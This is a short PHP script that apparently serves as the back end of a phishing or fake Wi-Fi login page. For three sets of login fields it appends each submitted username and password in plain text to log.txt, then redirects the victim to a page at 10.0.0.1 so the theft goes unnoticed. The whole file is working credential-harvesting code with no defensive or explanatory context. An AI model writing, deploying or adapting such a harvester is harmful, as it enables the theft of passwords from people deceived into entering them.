<?php
if( isset($_POST['username_member'] ) && isset( $_POST['password_member'] ) )
{
    $txt= 'username '.$_POST['username_member'].' - '.'pass '.$_POST['password_member'] . PHP_EOL;
    file_put_contents('log.txt', $txt, FILE_APPEND);
    header( "Location: http://10.0.0.1/index.html" );
}
if( isset($_POST['username_komunitas'] ) && isset( $_POST['password_komunitas'] ) )
{
    $txt= 'username '.$_POST['username_komunitas'].' - '.'pass '.$_POST['password_komunitas'] . PHP_EOL;
    file_put_contents('log.txt', $txt, FILE_APPEND);
    header( "Location: http://10.0.0.1/index.html" );
}
if( isset($_POST['username'] ) && isset( $_POST['password'] ) )
{
    $txt= 'username '.$_POST['username'].' - '.'pass '.$_POST['password'] . PHP_EOL;
    file_put_contents('log.txt', $txt, FILE_APPEND);
    header( "Location: http://10.0.0.1/index.html" );
}
?>
